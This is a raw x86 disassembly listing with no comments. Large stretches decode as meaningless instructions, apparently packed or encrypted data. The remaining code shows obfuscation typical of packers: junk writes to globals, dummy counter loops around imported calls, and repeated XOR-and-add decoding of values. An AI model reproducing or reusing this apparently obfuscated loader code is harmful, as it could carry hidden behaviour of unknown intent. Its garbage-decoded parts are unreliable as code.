  408b0d:	or     BYTE PTR fs:[eax],dh
  408b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b11:	outs   dx,DWORD PTR ds:[esi]
  408b12:	popa   
  408b13:	ins    BYTE PTR es:[edi],dx
  408b14:	scas   eax,DWORD PTR es:[edi]
  408b15:	pop    edi
  408b16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408b17:	sar    BYTE PTR [esi+0x7e],cl
  408b1a:	inc    ebp
  408b1b:	jg     0x408b9b
  408b1d:	jle    0x408b9c
  408b1f:	cmc    
  408b20:	sbb    bh,BYTE PTR [eax]
  408b22:	pop    ds
  408b23:	shl    BYTE PTR cs:[edx],1
  408b26:	xor    ebx,esi
  408b28:	mov    edx,0x21588437
  408b2d:	neg    DWORD PTR [edi-0x6a2efb5b]
  408b33:	rcl    DWORD PTR [eax+ecx*8],1
  408b36:	mov    esp,0x6f6d962c
  408b3b:	mov    eax,0xb2f84c2a
  408b40:	and    eax,0xc323874
  408b45:	cmp    DWORD PTR [edx+0x1fdba71],esp
  408b4b:	ins    BYTE PTR es:[edi],dx
  408b4c:	ret    0x221b
  408b4f:	push   eax
  408b50:	cmp    bl,BYTE PTR [eax+eax*2+0x42]
  408b54:	outs   dx,DWORD PTR fs:[esi]
  408b56:	mov    ebp,0x8d00288f
  408b5b:	jmp    DWORD PTR [ecx]
  408b5d:	xor    edx,edi
  408b5f:	les    ebp,FWORD PTR [esi-0x80]
  408b62:	mov    edi,0x7cfc202a
  408b67:	ret    
  408b68:	test   eax,0x4892c0d3
  408b6d:	sbb    DWORD PTR [ecx+0x2b],ecx
  408b70:	dec    eax
  408b71:	mov    ch,0xa1
  408b73:	daa    
  408b74:	and    BYTE PTR [ebx],bl
  408b76:	loopne 0x408b4d
  408b78:	ror    BYTE PTR [edi+0x109f7850],cl
  408b7e:	repz cmp BYTE PTR [ecx+0x7a32c915],ah
  408b85:	and    dl,dl
  408b87:	leave  
  408b88:	mov    esp,DWORD PTR [edx-0x78]
  408b8b:	daa    
  408b8c:	imul   edi,DWORD PTR [edi+ecx*4-0x64e61877],0x7f43b01e
  408b97:	sbb    DWORD PTR [ecx+0x6c],ebp
  408b9a:	lods   eax,DWORD PTR ds:[esi]
  408b9b:	in     al,dx
  408b9c:	bound  esp,QWORD PTR [edi+0x1d]
  408b9f:	popf   
  408ba0:	push   cs
  408ba1:	cmc    
  408ba2:	test   eax,0x126eec2c
  408ba7:	loope  0x408bf7
  408ba9:	or     DWORD PTR [eax-0x3a6335fd],esp
  408baf:	js     0x408b6e
  408bb1:	sbb    DWORD PTR [edx-0x4c],eax
  408bb4:	mov    edx,0x84a188e4
  408bb9:	cwde   
  408bba:	in     eax,dx
  408bbb:	pop    ecx
  408bbc:	(bad)  
  408bbd:	(bad)  
  408bbe:	nop
  408bbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bc0:	test   BYTE PTR [ebx-0x731712af],ch
  408bc6:	push   ebx
  408bc7:	mov    bl,0x25
  408bc9:	lea    ebx,[edi+esi*2+0x7d818fe3]
  408bd0:	in     al,0xe4
  408bd2:	xchg   ebx,eax
  408bd3:	inc    eax
  408bd4:	sbb    eax,0xa767725f
  408bd9:	test   eax,0x1f0700fa
  408bde:	js     0x408ba2
  408be0:	cmp    cl,BYTE PTR [edx-0x307f8847]
  408be6:	pop    es
  408be7:	stos   DWORD PTR es:[edi],eax
  408be8:	cmp    edi,DWORD PTR [ebx+0x4d]
  408beb:	jecxz  0x408bd0
  408bed:	and    esi,DWORD PTR [edi+esi*8-0x5e3a47cb]
  408bf4:	loope  0x408bec
  408bf6:	leave  
  408bf7:	rcl    BYTE PTR [edi-0x5f118e12],cl
  408bfd:	dec    edx
  408bfe:	mov    esp,0xcdc3714d
  408c03:	sti    
  408c04:	or     al,0x13
  408c06:	stos   BYTE PTR es:[edi],al
  408c07:	in     eax,dx
  408c08:	es ret 
  408c0a:	pop    eax
  408c0b:	mov    edx,eax
  408c0d:	sub    al,0x6f
  408c0f:	mov    ebp,0x6328c011
  408c14:	aas    
  408c15:	leave  
  408c16:	and    esp,DWORD PTR ds:0xf9f35128
  408c1c:	call   DWORD PTR [ebp-0x6ae2ecd5]
  408c22:	sbb    BYTE PTR ds:0x4cbbd7dc,cl
  408c28:	out    dx,eax
  408c29:	mov    ebp,0x5407e331
  408c2e:	push   eax
  408c2f:	or     al,0x27
  408c31:	out    0x8d,al
  408c33:	shr    DWORD PTR [ebx+0x6d814913],cl
  408c39:	pop    ds
  408c3a:	leave  
  408c3b:	lods   eax,DWORD PTR ds:[esi]
  408c3c:	pop    edx
  408c3d:	retf   
  408c3e:	xor    BYTE PTR [esi+0x2845c974],ch
  408c44:	repz jno 0x408c80
  408c47:	xor    BYTE PTR ds:0x3c4ff03,al
  408c4d:	pop    DWORD PTR [esi-0x75]
  408c50:	xchg   ebp,eax
  408c51:	inc    edx
  408c52:	push   edi
  408c53:	mov    ah,0x91
  408c55:	sbb    DWORD PTR [edi+0x34984f2a],edx
  408c5b:	mov    ds:0x12f1f2a1,al
  408c60:	mov    ah,0x75
  408c62:	les    esp,FWORD PTR [edx]
  408c64:	pop    ds
  408c65:	mov    edi,0x5fc08991
  408c6a:	dec    DWORD PTR [ebx-0x6d]
  408c6d:	test   al,0xd8
  408c70:	(bad)  
  408c71:	pop    edx
  408c72:	dec    eax
  408c73:	out    dx,al
  408c74:	sub    cl,BYTE PTR [ebx-0x30]
  408c77:	bnd jne 0x408c43
  408c7a:	rcr    DWORD PTR [esi+eax*4+0x7bf20b29],0x26
  408c82:	jg     0x191bdd4a
  408c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408c89:	jno    0x408c53
  408c8b:	iret   
  408c8c:	je     0x408cd7
  408c8e:	cwde   
  408c8f:	aad    0x8
  408c91:	mov    esi,DWORD PTR [edi+esi*1-0x11706ca8]
  408c98:	mov    edi,0x2c9e9127
  408c9d:	jb     0x408c8f
  408c9f:	jbe    0x408cfc
  408ca1:	jmp    0x408d11
  408ca3:	int    0x11
  408ca5:	inc    ebp
  408ca6:	mov    esp,0x4f39f889
  408cab:	push   ss
  408cac:	fmul   st(5),st
  408cae:	call   FWORD PTR [esi+esi*4]
  408cb1:	pop    edi
  408cb2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408cb3:	pop    ebp
  408cb4:	fnstenv [esp+edx*1+0x2a6f429]
  408cbb:	mov    dl,0xa3
  408cbd:	or     DWORD PTR [ebx+0x54],esi
  408cc0:	push   ebx
  408cc1:	push   ebx
  408cc2:	nop
  408cc3:	and    esp,DWORD PTR [edi-0x79a1fd35]
  408cc9:	mov    bl,dh
  408ccb:	sbb    ebx,DWORD PTR [eax]
  408ccd:	push   0x2e5987cb
  408cd2:	lahf   
  408cd3:	cli    
  408cd4:	and    esi,0x1e
  408cd7:	jg     0x408c68
  408cd9:	bound  ebx,QWORD PTR [edi+0x1c488db3]
  408cdf:	(bad)  
  408ce0:	js     0x408cab
  408ce2:	fs sbb al,0x47
  408ce5:	sbb    al,0x2f
  408ce7:	je     0x408d44
  408ce9:	xchg   edi,eax
  408cea:	mov    DWORD PTR [esi],edx
  408cec:	mov    ds:0x6ad5569f,al
  408cf1:	pop    ebp
  408cf2:	jg     0x408cbb
  408cf4:	std    
  408cf5:	add    eax,0x32729d
  408cfa:	mov    DWORD PTR [edx],eax
  408cfc:	mov    edx,DWORD PTR ds:0x4306f6
  408d02:	mov    eax,ds:0x430712
  408d07:	sub    edx,eax
  408d09:	xor    edx,DWORD PTR [edx+eax*1]
  408d0c:	mov    eax,DWORD PTR [ebp+0x14]
  408d0f:	mov    edx,DWORD PTR [ebp+0x10]
  408d12:	mov    DWORD PTR [edx+0x4],eax
  408d15:	mov    eax,DWORD PTR [ebp+0x18]
  408d18:	mov    edx,DWORD PTR [ebp+0x10]
  408d1b:	mov    DWORD PTR [edx+0x8],eax
  408d1e:	mov    eax,DWORD PTR [ebp+0x1c]
  408d21:	mov    edx,DWORD PTR [ebp+0x10]
  408d24:	mov    DWORD PTR [edx+0xc],eax
  408d27:	mov    eax,DWORD PTR [ebp+0x20]
  408d2a:	mov    edx,DWORD PTR [ebp+0x10]
  408d2d:	mov    DWORD PTR [edx+0x10],eax
  408d30:	mov    eax,eax
  408d32:	mov    eax,DWORD PTR [ebp+0x14]
  408d35:	test   eax,eax
  408d37:	mov    eax,DWORD PTR [ebp+0x8]
  408d3a:	jne    0x408f37
  408d40:	mov    eax,DWORD PTR [ebp+0xc]
  408d43:	jmp    0x408f37
  408d48:	test   BYTE PTR [ebx+0x4d],al
  408d4b:	pushf  
  408d4c:	dec    ebp
  408d4d:	pushf  
  408d4e:	inc    ebp
  408d4f:	pop    ebx
  408d50:	cwde   
  408d51:	mov    ss,edx
  408d53:	aaa    
  408d54:	push   cs
  408d55:	sub    DWORD PTR [ebp+edi*8+0x7e7ed48c],ebx
  408d5c:	inc    ebp
  408d5d:	jg     0x408ddd
  408d5f:	jle    0x408dde
  408d61:	xor    BYTE PTR [esi],dl
  408d63:	sbb    DWORD PTR [esi],esp
  408d65:	call   0x6c14ae8f
  408d6a:	dec    eax
  408d6b:	sbb    dh,BYTE PTR [esi]
  408d6d:	ja     0x408d0e
  408d6f:	sti    
  408d70:	adc    al,0xf4
  408d72:	jle    0x408d21
  408d74:	xor    ecx,DWORD PTR [ecx-0x74]
  408d77:	loope  0x408d6e
  408d79:	xchg   esp,eax
  408d7a:	repz sbb BYTE PTR ds:0x52848b88,ah
  408d81:	pop    ss
  408d82:	popf   
  408d83:	stos   DWORD PTR es:[edi],eax
  408d84:	loopne 0x408da2
  408d86:	loope  0x408da8
  408d88:	jo     0x408d55
  408d8a:	adc    DWORD PTR [edi],edi
  408d8c:	gs sti 
  408d8e:	imul   edx,DWORD PTR [edi+eiz*4-0x7d],0xffffffe0
  408d93:	cmc    
  408d94:	(bad)  
  408d95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408d96:	jnp    0x408d31
  408d98:	mov    ebp,0x10a0ab69
  408d9d:	into   
  408d9e:	and    bh,BYTE PTR [ebx]
  408da0:	ds pop eax
  408da2:	adc    DWORD PTR [ebx-0x6d],ebx
  408da5:	pop    ss
  408da6:	fwait
  408da7:	pop    ebx
  408da8:	fdiv   QWORD PTR [eax-0xde0b391]
  408dae:	push   cs
  408daf:	mov    al,0xa
  408db1:	cdq    
  408db2:	(bad)  
  408db3:	das    
  408db4:	sbb    ch,BYTE PTR [esi+0x15]
  408db7:	(bad)  
  408db8:	call   0x11e3766e
  408dbd:	in     eax,0x84
  408dbf:	sahf   
  408dc0:	sbb    BYTE PTR [ebx],bl
  408dc2:	(bad)  
  408dc3:	mov    al,0x3
  408dc5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408dc6:	aad    0x53
  408dc8:	pop    ecx
  408dc9:	dec    ebx
  408dca:	pop    esi
  408dcb:	mov    ebx,0x2d26f5e5
  408dd0:	mov    edi,0xb9e2239e
  408dd5:	fmul   DWORD PTR [ebx]
  408dd7:	mov    ecx,0x5c5056ba
  408ddc:	jmp    0x408e21
  408dde:	shr    DWORD PTR [ebp+ecx*8+0xf2af49d],0xdc
  408de6:	mov    esi,0x3a648f6
  408deb:	repz mov ch,0x1c
  408dee:	out    0x68,al
  408df0:	add    BYTE PTR [esi+edi*1],al
  408df3:	in     al,0xee
  408df5:	fnstsw WORD PTR [edi]
  408df7:	sub    ebp,edx
  408df9:	int    0x91
  408dfb:	pop    ebp
  408dfc:	ja     0x408da0
  408dfe:	inc    edi
  408dff:	jne    0x408db8
  408e01:	(bad)  
  408e02:	push   ss
  408e03:	fcom   DWORD PTR ds:0x10aafeff
  408e09:	(bad)  
  408e0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408e0b:	fs xor esi,esp
  408e0e:	add    edi,DWORD PTR [esi-0x6cea2274]
  408e14:	popf   
  408e15:	call   0x4ade:0x4589bb38
  408e1c:	enter  0x87d7,0x6c
  408e20:	sbb    DWORD PTR [ecx+0x9],0x508dce7d
  408e27:	imul   edi,edi,0x91911861
  408e2d:	cmp    BYTE PTR [edi+0x896f53a],al
  408e33:	jl     0x408e11
  408e35:	int    0x2
  408e37:	in     eax,0xab
  408e39:	les    esp,FWORD PTR [ebp+0x7da59da]
  408e3f:	adc    dh,BYTE PTR [ecx-0x602dfb6d]
  408e45:	mov    bh,0xe8
  408e47:	xchg   edi,eax
  408e48:	or     eax,DWORD PTR [ebx+eax*2-0x6d]
  408e4c:	pop    ss
  408e4d:	xchg   BYTE PTR [edx+0x2ce9cde3],al
  408e53:	mov    bh,bl
  408e55:	je     0x408e53
  408e57:	sahf   
  408e58:	bound  esp,QWORD PTR [edi+ebx*4]
  408e5b:	cs ins DWORD PTR es:[edi],dx
  408e5d:	stos   DWORD PTR es:[edi],eax
  408e5e:	sub    edi,ecx
  408e60:	ror    DWORD PTR [ebx+0x3c2dafb1],0x7e
  408e67:	(bad)  [esi-0x4b]
  408e6a:	mov    ebp,0x7c26c724
  408e6f:	and    BYTE PTR ds:0x76a55005,ah
  408e75:	jecxz  0x408ef4
  408e77:	aad    0x10
  408e79:	std    
  408e7a:	hlt    
  408e7b:	icebp  
  408e7c:	push   edx
  408e7d:	imul   BYTE PTR [esi+0x38]
  408e80:	adc    ah,dh
  408e82:	and    al,0x82
  408e84:	fimul  DWORD PTR [esi+edi*1+0x5a]
  408e88:	stos   DWORD PTR es:[edi],eax
  408e89:	dec    esi
  408e8a:	push   esp
  408e8b:	mov    al,0x85
  408e8d:	mov    WORD PTR [ecx-0x2],?
  408e90:	jmp    0x6a77c084
  408e95:	cs hlt 
  408e97:	dec    ebx
  408e98:	lds    edi,FWORD PTR [ebx-0x7a18f066]
  408e9e:	mov    cl,0xe3
  408ea0:	inc    ebp
  408ea1:	dec    esi
  408ea2:	pushf  
  408ea3:	shl    DWORD PTR [edi+0x61],0x38
  408ea7:	imul   edx,DWORD PTR [eax],0x2ef2b253
  408ead:	mov    ds:0x8f325e69,al
  408eb2:	cmp    eax,DWORD PTR [eax]
  408eb4:	jb     0x408e53
  408eb6:	addr16 and edx,edi
  408eb9:	fsubp  st(3),st
  408ebb:	cdq    
  408ebc:	aas    
  408ebd:	xchg   esi,eax
  408ebe:	xchg   ebx,eax
  408ebf:	rol    BYTE PTR [edx+eax*8-0x5f],0x51
  408ec4:	xchg   BYTE PTR [eax],cl
  408ec6:	imul   esp,DWORD PTR [eax],0xffffffd1
  408ec9:	(bad)
  408ece:	pop    edi
  408ecf:	pop    edi
  408ed0:	in     eax,dx
  408ed1:	rol    DWORD PTR [eiz*4-0x2c57f6f],cl
  408ed8:	fs retf 0x6b79
  408edc:	mov    ecx,0x7de9e8fd
  408ee1:	xor    eax,0xbd8277a1
  408ee6:	xor    eax,0x62e925f7
  408eeb:	xchg   ch,cl
  408eed:	sub    eax,0xc5c8bd9e
  408ef2:	in     al,dx
  408ef3:	aaa    
  408ef4:	sbb    BYTE PTR [esi],al
  408ef6:	hlt    
  408ef7:	xlat   BYTE PTR ds:[ebx]
  408ef8:	and    al,0x2d
  408efa:	push   ss
  408efb:	(bad)  
  408efd:	aas    
  408efe:	xchg   edx,eax
  408eff:	repz mov ds:0x8fb88ccd,al
  408f05:	sub    dh,bl
  408f07:	cdq    
  408f08:	mov    al,0xfe
  408f0a:	jno    0x408eb8
  408f0c:	lock iret 
  408f0e:	or     DWORD PTR [ecx-0x34],ebp
  408f11:	fsub   QWORD PTR [ecx]
  408f13:	adc    eax,0x1023633a
  408f18:	jmp    0x408eae
  408f1a:	dec    esi
  408f1b:	jbe    0x408ef5
  408f1d:	rol    DWORD PTR [eax+0x1d],1
  408f20:	inc    edx
  408f21:	or     edi,esi
  408f23:	repnz fsub DWORD PTR [ecx+0x1fade069]
  408f2a:	mov    ch,0xf4
  408f2c:	jmp    0x408f20
  408f2e:	xchg   edi,eax
  408f2f:	ret    0xb249
  408f32:	addr16 test al,0xb6
  408f35:	ins    DWORD PTR es:[edi],dx
  408f36:	ds xor eax,ecx
  408f39:	add    eax,0x32729d
  408f3e:	leave  
  408f3f:	ret    0x1c
  408f42:	push   ebp
  408f43:	mov    ebp,esp
  408f45:	sub    esp,0x10c
  408f4b:	push   ebx
  408f4c:	sbb    DWORD PTR ds:0x42ef88,0x42e8ea
  408f56:	push   esi
  408f57:	push   edi
  408f58:	xor    DWORD PTR ds:0x4306c6,0x5477
  408f62:	push   0x412320
  408f67:	sbb    DWORD PTR ds:0x42efa8,0x42e8e6
  408f71:	call   DWORD PTR ds:0x42ebcc
  408f77:	sbb    DWORD PTR ds:0x42e8e2,0x6315
  408f81:	test   eax,eax
  408f83:	je     0x408f9a
  408f89:	or     DWORD PTR ds:0x43062e,0x658e
  408f93:	xor    eax,eax
  408f95:	jmp    0x40a1a9
  408f9a:	or     DWORD PTR ds:0x430632,0x1a2e
  408fa4:	push   0x412364
  408fa9:	call   DWORD PTR ds:0x42ec84
  408faf:	sbb    DWORD PTR ds:0x4306d2,0x34b4
  408fb9:	test   ax,ax
  408fbc:	mov    DWORD PTR ds:0x42e8da,0xd26
  408fc6:	je     0x408feb
  408fcc:	push   0x786876
  408fd1:	push   0x55897097
  408fd6:	adc    DWORD PTR ds:0x430642,0x42ef88
  408fe0:	call   DWORD PTR ds:0x42ed00
  408fe6:	jmp    0x40a1a9
  408feb:	sub    DWORD PTR ds:0x42efa4,0x1c30
  408ff5:	call   DWORD PTR ds:0x42ecc4
  408ffb:	cdq    
  408ffc:	cmp    eax,0x67876766
  409001:	mov    DWORD PTR ds:0x4306da,0x4f36
  40900b:	jne    0x409041
  409011:	cmp    edx,0x86189768
  409017:	mov    DWORD PTR ds:0x42ef94,0x24b9
  409021:	jne    0x409041
  409027:	sub    DWORD PTR ds:0x42e8e2,0x452
  409031:	push   0x412380
  409036:	call   DWORD PTR ds:0x42ebbc
  40903c:	jmp    0x40a1a9
  409041:	neg    DWORD PTR ds:0x43062a
  409047:	push   0x4123e0
  40904c:	adc    DWORD PTR ds:0x42efa4,0x43061a
  409056:	call   DWORD PTR ds:0x42ec5c
  40905c:	test   ax,ax
  40905f:	jne    0x408f89
  409065:	and    DWORD PTR ds:0x42e8e2,0x0
  40906f:	xor    ebx,ebx
  409071:	xor    ebx,DWORD PTR ds:0x42e8e2
  409077:	inc    ebx
  409078:	mov    DWORD PTR ds:0x42e8e2,ebx
  40907e:	cmp    DWORD PTR ds:0x42e8e2,0x28
  409085:	jne    0x409097
  40908b:	push   DWORD PTR [ebp-0x10]
  40908e:	push   DWORD PTR [ebp-0x18]
  409091:	call   DWORD PTR ds:0x42ed2c
  409097:	cmp    DWORD PTR ds:0x42e8e2,0x1c
  40909e:	jb     0x40906f
  4090a4:	mov    edx,DWORD PTR ds:0x42ef94
  4090aa:	and    DWORD PTR ds:0x42efa0,edx
  4090b0:	mov    ecx,0xf89c8535
  4090b5:	movzx  edx,BYTE PTR ds:0x43060e
  4090bc:	sbb    edx,DWORD PTR ds:0x4306ce
  4090c2:	mov    DWORD PTR ds:0x43060e,edx
  4090c8:	mov    DWORD PTR [ebp-0x20],ecx
  4090cb:	and    DWORD PTR ds:0x43061e,0x0
  4090d5:	mov    edx,DWORD PTR ds:0x43061e
  4090db:	inc    edx
  4090dc:	mov    DWORD PTR ds:0x43061e,edx
  4090e2:	cmp    DWORD PTR ds:0x43061e,0x21
  4090e9:	jne    0x409109
  4090ef:	push   0x59b7
  4090f4:	push   0x42e8fa
  4090f9:	push   0x42ea2d
  4090fe:	push   0x7470
  409103:	call   DWORD PTR ds:0x42ed30
  409109:	cmp    DWORD PTR ds:0x43061e,0x15
  409110:	jb     0x4090d5
  409116:	and    DWORD PTR ds:0x42e8e6,0x0
  409120:	mov    edx,DWORD PTR ds:0x42e8e6
  409126:	inc    edx
  409127:	mov    DWORD PTR ds:0x42e8e6,edx
  40912d:	cmp    DWORD PTR ds:0x42e8e6,0x20
  409134:	jne    0x40914a
  40913a:	push   0x704d
  40913f:	push   0x180e
  409144:	call   DWORD PTR ds:0x42ec30
  40914a:	cmp    DWORD PTR ds:0x42e8e6,0x13
  409151:	jb     0x409120
  409157:	adc    DWORD PTR ds:0x43061a,edi
  40915d:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  409164:	and    DWORD PTR ds:0x43060a,0x0
  40916e:	mov    esi,DWORD PTR ds:0x43060a
  409174:	inc    esi
  409175:	mov    DWORD PTR ds:0x43060a,esi
  40917b:	cmp    DWORD PTR ds:0x43060a,0xd
  409182:	jne    0x40919d
  409188:	push   0x42e9fb
  40918d:	push   0x42e8fa
  409192:	push   0x400000
  409197:	call   DWORD PTR ds:0x42ec48
  40919d:	cmp    DWORD PTR ds:0x43060a,0xc
  4091a4:	jne    0x4091b7
  4091aa:	mov    esi,DWORD PTR ds:0x43060a
  4091b0:	inc    esi
  4091b1:	mov    DWORD PTR ds:0x43060a,esi
  4091b7:	cmp    DWORD PTR ds:0x43060a,0x14
  4091be:	jb     0x40916e
  4091c4:	sub    esi,DWORD PTR ds:0x42ef9c
  4091ca:	lea    eax,[ebp-0x58]
  4091cd:	mov    DWORD PTR [ebp-0x60],eax
  4091d0:	add    esi,esi
  4091d2:	lea    eax,[ebp-0x50]
  4091d5:	inc    ebx
  4091d6:	mov    DWORD PTR [ebp-0x10],eax
  4091d9:	inc    esi
  4091da:	mov    eax,ds:0x4121a8
  4091df:	mov    eax,DWORD PTR [eax+0x1c8]
  4091e5:	or     DWORD PTR ds:0x4306ce,0x430622
  4091ef:	mov    eax,DWORD PTR [eax]
  4091f1:	add    esi,ebx
  4091f3:	mov    edx,DWORD PTR [ebp-0x10]
  4091f6:	xor    esi,esi
  4091f8:	xor    esi,DWORD PTR ds:0x4306ce
  4091fe:	adc    DWORD PTR ds:0x42ef98,esi
  409204:	mov    esi,0x7510856
  409209:	xor    DWORD PTR ds:0x43060e,ebx
  40920f:	xor    eax,esi
  409211:	mov    ebx,0x32729d
  409216:	add    eax,ebx
  409218:	mov    DWORD PTR [edx],eax
  40921a:	mov    eax,ds:0x43060e
  40921f:	mov    eax,ds:0x4124e4
  409224:	cmp    eax,0x23d14057
  409229:	mov    eax,DWORD PTR [ebp-0x18]
  40922c:	mov    DWORD PTR ds:0x43060e,0x7d60
  409236:	je     0x409262
  40923c:	mov    ecx,DWORD PTR [ebp-0x20]
  40923f:	xor    eax,esi
  409241:	adc    DWORD PTR ds:0x43061e,0x43063a
  40924b:	add    eax,ebx
  40924d:	imul   eax,ecx
  409250:	mov    DWORD PTR ds:0x43062e,0x73a3
  40925a:	mov    DWORD PTR [ebp-0x20],eax
  40925d:	jmp    0x409dc0
  409262:	xor    eax,esi
  409264:	adc    edx,0x5f1b
  40926a:	add    eax,ebx
  40926c:	mov    ds:0x4122b8,eax
  409271:	mov    edx,DWORD PTR ds:0x430662
  409277:	mov    eax,ds:0x42eb1c
  40927c:	sub    eax,edx
  40927e:	or     edx,DWORD PTR [edx+eax*1]
  409281:	mov    eax,DWORD PTR [ebp-0x20]
  409284:	xor    eax,esi
  409286:	add    eax,ebx
  409288:	mov    ds:0x4124e4,eax
  40928d:	sub    DWORD PTR ds:0x42e8ee,0x78a9
  409297:	mov    eax,DWORD PTR [ebp-0x18]
  40929a:	add    edx,DWORD PTR ds:0x43062a
  4092a0:	mov    edx,DWORD PTR ds:0x4122b8
  4092a6:	neg    DWORD PTR ds:0x43063a
  4092ac:	xor    eax,esi
  4092ae:	dec    DWORD PTR ds:0x430632
  4092b4:	add    eax,ebx
  4092b6:	mov    DWORD PTR ds:0x4306d6,0x3216
  4092c0:	cmp    edx,eax
  4092c2:	jne    0x409dc0
  4092c8:	mov    eax,DWORD PTR [ebp-0x18]
  4092cb:	add    edx,0x2278
  4092d1:	mov    DWORD PTR [ebp-0x30],eax
  4092d4:	mov    eax,DWORD PTR [ebp-0x20]
  4092d7:	mov    DWORD PTR ds:0x42efa0,0x10
  4092e1:	cmp    DWORD PTR ds:0x42efa0,0x0
  4092e8:	je     0x409328
  4092ee:	cmp    DWORD PTR ds:0x42efa0,0x16
  4092f5:	jne    0x409310
  4092fb:	push   0x55c8
  409300:	push   0x6c0c
  409305:	push   0x400000
  40930a:	call   DWORD PTR ds:0x42ec4c
  409310:	mov    edi,DWORD PTR ds:0x42efa0
  409316:	dec    edi
  409317:	mov    DWORD PTR ds:0x42efa0,edi
  40931d:	jmp    0x4092e1
  409322:	add    DWORD PTR ds:0x42ef94,ebx
  409328:	mov    DWORD PTR [ebp-0x1c],eax
  40932b:	or     DWORD PTR ds:0x42e8f6,0x513d
  409335:	mov    eax,ds:0x4121a8
  40933a:	mov    eax,DWORD PTR [eax+0x198]
  409340:	not    edx
  409342:	mov    DWORD PTR [ebp-0xc],eax
  409345:	xor    edx,edx
  409347:	add    edx,DWORD PTR ds:0x42e8f2
  40934d:	adc    edx,DWORD PTR ds:0x430642
  409353:	mov    DWORD PTR ds:0x42e8f2,edx
  409359:	mov    eax,DWORD PTR [ebp-0x1c]
  40935c:	mov    edx,DWORD PTR [ebp-0xc]
  40935f:	and    DWORD PTR ds:0x42efac,0x0
  409369:	mov    edi,DWORD PTR ds:0x42efac
  40936f:	inc    edi
  409370:	mov    DWORD PTR ds:0x42efac,edi
  409376:	cmp    DWORD PTR ds:0x42efac,0x6
  40937d:	jne    0x409391
  409383:	push   DWORD PTR [ebp-0x10]
  409386:	push   0x42e8e6
  40938b:	call   DWORD PTR ds:0x42ed34
  409391:	cmp    DWORD PTR ds:0x42efac,0x5
  409398:	jne    0x4093ad
  40939e:	xor    edi,edi
  4093a0:	xor    edi,DWORD PTR ds:0x42efac
  4093a6:	inc    edi
  4093a7:	mov    DWORD PTR ds:0x42efac,edi
  4093ad:	cmp    DWORD PTR ds:0x42efac,0x1b
  4093b4:	jb     0x409369
  4093ba:	xor    DWORD PTR ds:0x430632,0x56f9
  4093c4:	xor    eax,esi
  4093c6:	and    DWORD PTR ds:0x42efa8,0x0
  4093d0:	jmp    0x4093e2
  4093d5:	mov    edi,DWORD PTR ds:0x42efa8
  4093db:	inc    edi
  4093dc:	mov    DWORD PTR ds:0x42efa8,edi
  4093e2:	cmp    DWORD PTR ds:0x42efa8,0x1f
  4093e9:	jae    0x40946a
  4093ef:	cmp    DWORD PTR ds:0x42efa8,0x6
  4093f6:	jne    0x409402
  4093fc:	call   DWORD PTR ds:0x42ec50
  409402:	cmp    DWORD PTR ds:0x42efa8,0x5
  409409:	jne    0x40941c
  40940f:	mov    edi,DWORD PTR ds:0x42efa8
  409415:	inc    edi
  409416:	mov    DWORD PTR ds:0x42efa8,edi
  40941c:	jmp    0x4093d5
  409421:	mov    DWORD PTR ds:0x42ef8c,0x12
  40942b:	cmp    DWORD PTR ds:0x42ef8c,0x0
  409432:	je     0x40946a
  409438:	cmp    DWORD PTR ds:0x42ef8c,0x21
  40943f:	jne    0x409450
  409445:	push   0x79c1
  40944a:	call   DWORD PTR ds:0x42ec34
  409450:	xor    edi,edi
  409452:	or     edi,DWORD PTR ds:0x42ef8c
  409458:	dec    edi
  409459:	mov    DWORD PTR ds:0x42ef8c,edi
  40945f:	jmp    0x40942b
  409464:	and    edi,DWORD PTR ds:0x4306da
  40946a:	add    eax,ebx
  40946c:	mov    DWORD PTR [edx],eax
  40946e:	lea    eax,[ebp-0x14]
  409471:	and    edi,DWORD PTR ds:0x43060a
  409477:	mov    DWORD PTR [ebp-0x44],eax
  40947a:	mov    edi,DWORD PTR ds:0x43061e
  409480:	adc    edi,DWORD PTR ds:0x42ef98
  409486:	mov    DWORD PTR ds:0x43061e,edi
  40948c:	mov    eax,DWORD PTR [ebp-0x1c]
  40948f:	sbb    DWORD PTR ds:0x42efb0,0x42e8ea
  409499:	mov    edx,DWORD PTR [ebp-0x44]
  40949c:	sbb    DWORD PTR ds:0x42efa0,0x43063a
  4094a6:	xor    eax,esi
  4094a8:	add    eax,ebx
  4094aa:	movzx  edi,WORD PTR ds:0x430642
  4094b1:	and    DWORD PTR ds:0x43063e,edi
  4094b7:	mov    DWORD PTR [edx],eax
  4094b9:	add    DWORD PTR ds:0x42e8f6,0x43061a
  4094c3:	mov    DWORD PTR [ebp-0x54],ecx
  4094c6:	or     edi,edi
  4094c8:	lea    eax,[ebp-0x54]
  4094cb:	mov    DWORD PTR [ebp-0x10],eax
  4094ce:	sub    ecx,DWORD PTR ds:0x430626
  4094d4:	mov    eax,DWORD PTR [ebp-0x54]
  4094d7:	mov    ecx,DWORD PTR [ebp-0x10]
  4094da:	mov    DWORD PTR ds:0x42efac,0x1c
  4094e4:	cmp    DWORD PTR ds:0x42efac,0x0
  4094eb:	je     0x409533
  4094f1:	cmp    DWORD PTR ds:0x42efac,0x27
  4094f8:	jne    0x40950c
  4094fe:	push   DWORD PTR [ebp-0x20]
  409501:	push   0x215b
  409506:	call   DWORD PTR ds:0x42ed38
  40950c:	xor    edi,edi
  40950e:	xor    edi,DWORD PTR ds:0x42efac
  409514:	dec    edi
  409515:	mov    DWORD PTR ds:0x42efac,edi
  40951b:	jmp    0x4094e4
  409520:	movzx  edi,BYTE PTR ds:0x42e8ea
  409527:	or     edi,DWORD PTR ds:0x4306be
  40952d:	mov    DWORD PTR ds:0x42e8ea,edi
  409533:	xor    eax,esi
  409535:	xor    edi,0xc6b
  40953b:	add    eax,0x32729d
  409540:	mov    DWORD PTR [ecx],eax
  409542:	mov    eax,ds:0x41227c
  409547:	sbb    DWORD PTR ds:0x430622,0x6967
  409551:	mov    DWORD PTR [ebp-0x28],0x8e12febc
  409558:	mov    edi,DWORD PTR ds:0x43061a
  40955e:	sbb    DWORD PTR ds:0x42ef8c,edi
  409564:	mov    eax,DWORD PTR [eax]
